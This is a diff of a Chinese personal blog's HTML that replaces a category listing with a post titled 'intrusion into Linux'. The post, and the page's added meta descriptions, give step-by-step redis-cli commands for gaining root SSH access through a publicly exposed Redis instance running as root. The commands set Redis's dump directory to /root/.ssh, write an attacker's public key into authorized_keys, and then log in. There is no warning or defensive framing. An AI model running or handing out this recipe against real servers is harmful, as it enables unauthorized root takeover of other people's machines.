@@ -12,36 +12,36 @@
         }
     }
   </script>
-  <title>运维架构 - 爱睡懒觉的程序员</title>
+  <title> 入侵linux - 爱睡懒觉的程序员</title>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-
-<meta name="description" content="运维架构">
+<meta name="keywords" content="bug,">
+<meta name="description" content="利用暴露在公网redis端口 例如 redis在公网以root用户运行，ip为: 123.123.123.123,端口为 6379 1. redis-cli -h 123.123.123.123 -p 6379 2. config set dbfilename authorized_keys 3.">
 <meta name="author" content="coderzh">
 <meta name="publisher" content="coderzh">
 <meta name="generator" content="http://gohugo.io/"/>
 
-<meta itemprop="name" content="运维架构 - 爱睡懒觉的程序员">
-<meta itemprop="description" content="运维架构">
+<meta itemprop="name" content=" 入侵linux - 爱睡懒觉的程序员">
+<meta itemprop="description" content="利用暴露在公网redis端口 例如 redis在公网以root用户运行，ip为: 123.123.123.123,端口为 6379 1. redis-cli -h 123.123.123.123 -p 6379 2. config set dbfilename authorized_keys 3.">
 <meta itemprop="image" content="https://fiser321.github.io/public/coderzh.jpg">
 
-<meta property="og:title" content="运维架构 - 爱睡懒觉的程序员" />
+<meta property="og:title" content=" 入侵linux - 爱睡懒觉的程序员" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://fiser321.github.io/categories/%E8%BF%90%E7%BB%B4%E6%9E%B6%E6%9E%84/" />
+<meta property="og:url" content="https://fiser321.github.io/2017/10/17/bug-linux/" />
 <meta property="og:image" content="https://fiser321.github.io/public/coderzh.jpg" />
-<meta property="og:description" content="运维架构">
+<meta property="og:description" content="利用暴露在公网redis端口 例如 redis在公网以root用户运行，ip为: 123.123.123.123,端口为 6379 1. redis-cli -h 123.123.123.123 -p 6379 2. config set dbfilename authorized_keys 3.">
 
 <meta name="twitter:card" content="summary">
 <meta name="twitter:site" content="@coderzh">
-<meta name="twitter:title" content="运维架构 - 爱睡懒觉的程序员">
-<meta name="twitter:description" content="运维架构">
+<meta name="twitter:title" content=" 入侵linux - 爱睡懒觉的程序员">
+<meta name="twitter:description" content="利用暴露在公网redis端口 例如 redis在公网以root用户运行，ip为: 123.123.123.123,端口为 6379 1. redis-cli -h 123.123.123.123 -p 6379 2. config set dbfilename authorized_keys 3.">
 <meta name="twitter:creator" content="@coderzh">
 <meta name="twitter:image" content="https://fiser321.github.io/public/coderzh.jpg">
 
   <script>document.documentElement.className = document.documentElement.className.replace("no-js", "js");</script>
-  <link rel="canonical" href="https://fiser321.github.io/categories/%E8%BF%90%E7%BB%B4%E6%9E%B6%E6%9E%84/">
-  <link rel='shortlink' href="https://fiser321.github.io/categories/%E8%BF%90%E7%BB%B4%E6%9E%B6%E6%9E%84/"/>
+  <link rel="canonical" href="https://fiser321.github.io/2017/10/17/bug-linux/">
+  <link rel='shortlink' href="https://fiser321.github.io/2017/10/17/bug-linux/"/>
   <link rel="shortcut icon" href="https://fiser321.github.io/public/favicon.ico"/>
   
 <link rel="stylesheet" id="human-style-css" href="https://fiser321.github.io/wp-content/themes/hueman/style.css" type="text/css" media="all"/>
@@ -63,8 +63,7 @@
 
 </head>
 
-<body class="archive category col-3cm full-width topbar-enabled chrome">
-
+<body class="single single-post single-format-standard col-3cm full-width topbar-enabled chrome">
 <div id="wrapper">
   <header id="header">
 
@@ -165,48 +164,77 @@
         <div class="main-inner group">
           <section class="content">
             <div class="page-title pad group">
-              <h1><i class="fa fa-folder-open"></i>Category: <span>运维架构</span></h1>
+              <ul class="meta-single group">
+                
+                <li class="category">
+                  <a href="https://fiser321.github.io/categories/%E8%BF%90%E7%BB%B4%E6%9E%B6%E6%9E%84/" rel="category tag">运维架构</a>
+                </li>
+                
+              </ul>
             </div>
+
             <div class="pad group">
+
+              <article
+                  class="post type-post status-publish format-standard has-post-thumbnail hentry category-australien tag-bondi-beach tag-city2surf tag-sydney">
+                <div class="post-inner group">
+
+                  <h1 class="post-title"> 入侵linux</h1>
+
+                  <p class="post-byline">
+                    by  · 2017年10月13日 · 132 Words ·
+                    ~1min reading time |
+                    <a href="https://github.com/coderzh/coderzh-hugo-blog/blob/master/content/post/2017/2017-10-14.md"
+                       target="_blank">Improve on <i class="fa fa-github"></i></a>
+                  </p>
+
+                  <div class="clear"></div>
+
+                  <div class="entry">
+                    <div class="entry-inner">
+                      
+                      
+
+<h3 id="利用暴露在公网redis端口">利用暴露在公网redis端口</h3>
+
+<p>例如 redis在公网以root用户运行，ip为: 123.123.123.123,端口为 6379<br />
+1. redis-cli -h 123.123.123.123 -p 6379<br />
+2. config set dbfilename authorized_keys<br />
+3. config set dir &ldquo;/root/.ssh&rdquo;<br />
+4. set aa &ldquo;\n\n\$content\n\n\n&rdquo; 其中content 为~/.ssh/id_rsa.pub的字符串<br />
+5. save<br />
+6. ssh root@123.123.123.123</p>
+
+<p>###普通用户切换root用户<br />
+sudo sudo -i</p>
+
+                      
+                    </div>
+                    <div style="border: 1px dashed #e0e0e0; padding: 10px 10px 10px 10px; background-color: #fffeee; background-repeat: no-repeat; background-attachment: scroll; background-position: 1% 50%; -moz-background-size: auto auto; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inline-policy: -moz-initial;">
+                        <div style="float:left;margin-top:0px;">
+                        <img src="https://fiser321.github.io/public/qrcode.jpg" width="129px" height="129px"/>
+                        <div style="text-align:center;">微信扫一扫交流</div>
+                        </div>
+                        <div>
+                            <p style="margin-top:0px;">作者：<a target="_blank" href="http://fiser321.github.io/">fiser321</a>
+                            <br />微信关注：fisher321 （爱睡觉的程序员）
+                            <br />本文出处：<a target="_blank" href="https://fiser321.github.io/2017/10/17/bug-linux/">https://fiser321.github.io/2017/10/17/bug-linux/</a>
+                            <br />
+                            文章版权归本人所有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留追究法律责任的权利。 </p>
+                        </div>
+                    </div>
+                    <div class="clear"></div>
+                  </div>
+                  
+
+                </div>
+                
+              </article>
               
-                
-                
-                
+              <div class="clear"></div>
               
-              <div class="post-list group">
-  
-  <div class="post-row">
-    <article class="post-row type-post status-publish format-standard has-post-thumbnail hentry group">
-  <div class="post-inner post-hover">
-    <div class="post-meta group">
-  <p class="post-date">2017年10月13日</p>
-  <p class="post-title-small"><a href="https://fiser321.github.io/2017/10/17/bug-linux/" rel="bookmark" title=" 入侵linux"> 入侵linux</a></p>
-</div>
-
-  </div>
-  
-</article>
-
-
-  </div>
-  
-  <div class="post-row">
-    <article class="post-row type-post status-publish format-standard has-post-thumbnail hentry group">
-  <div class="post-inner post-hover">
-    <div class="post-meta group">
-  <p class="post-date">2017年10月13日</p>
-  <p class="post-title-small"><a href="https://fiser321.github.io/2017/10/17/base-linux/" rel="bookmark" title="Linux 常见命令总结">Linux 常见命令总结</a></p>
-</div>
-
-  </div>
-  
-</article>
-
-
-  </div>
-  
-</div>
-
+              
+              
             </div>
           </section>
           <div class="sidebar s1">
@@ -241,6 +269,26 @@
     <p> 微信扫一扫：<br/> 关注我的公众号： <br /> fisher321 <br /></p>
 </div>
 
+    <ul class="post-nav group">
+      <li class="next">
+        
+        <a href="https://fiser321.github.io/2017/10/17/base-linux/" rel="next">
+          <i class="fa fa-chevron-right"></i>
+          <strong>Next post</strong>
+          <span>Linux 常见命令总结</span>
+        </a>
+        
+      </li>
+      <li class="previous">
+        
+        <a href="https://fiser321.github.io/2017/10/17/env-python/" rel="prev">
+          <i class="fa fa-chevron-left"></i>
+          <strong>Previous Post</strong>
+          <span>python 环境</span>
+        </a>
+        
+      </li>
+    </ul>
     <div id="search-2" class="widget widget_search"><h3>Search</h3>
       <form method="get" class="searchform themeform" action="https://www.google.com/search">
         <div>
@@ -249,6 +297,7 @@
       </form>
     </div>
   </div>
+  
 </div>
 
           <div class="sidebar s2">
